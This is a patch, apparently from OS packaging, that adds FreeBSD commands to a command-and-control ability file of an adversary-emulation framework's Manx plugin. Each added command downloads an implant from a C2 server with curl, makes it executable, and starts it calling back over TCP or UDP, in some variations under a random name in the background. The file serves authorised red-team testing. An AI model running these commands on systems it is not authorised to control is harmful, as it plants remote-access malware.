@@ -1,0 +1,33 @@
+--- plugins/manx/data/abilities/command-and-control/356d1722-7784-40c4-822b-0cf864b0b36d.yml.orig	2022-08-08 23:34:48 UTC
++++ plugins/manx/data/abilities/command-and-control/356d1722-7784-40c4-822b-0cf864b0b36d.yml
+@@ -57,6 +57,30 @@
+               contact="tcp";
+               agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+               nohup ./$agent -http $server -socket $socket -contact $contact &
++    freebsd:
++      sh:
++        command: |
++          server="#{app.contact.http}";
++          socket="#{app.contact.tcp}";
++          contact="tcp";
++          curl -s -X POST -H "file:manx.go" -H "platform:freebsd" $server/file/download > #{agents.implant_name};
++          chmod +x #{agents.implant_name};
++          ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
++        variations:
++          - description: Run against the UDP contact
++            command: |
++              server="#{app.contact.http}";
++              socket="#{app.contact.udp}";
++              contact="udp";
++              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:freebsd" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
++              nohup ./$agent -http $server -socket $socket -contact $contact &
++          - description: Download with a random name and start as a background process
++            command: |
++              server="#{app.contact.http}";
++              socket="#{app.contact.tcp}";
++              contact="tcp";
++              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:freebsd" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
++              nohup ./$agent -http $server -socket $socket -contact $contact &
+     windows:
+       psh:
+         command: |
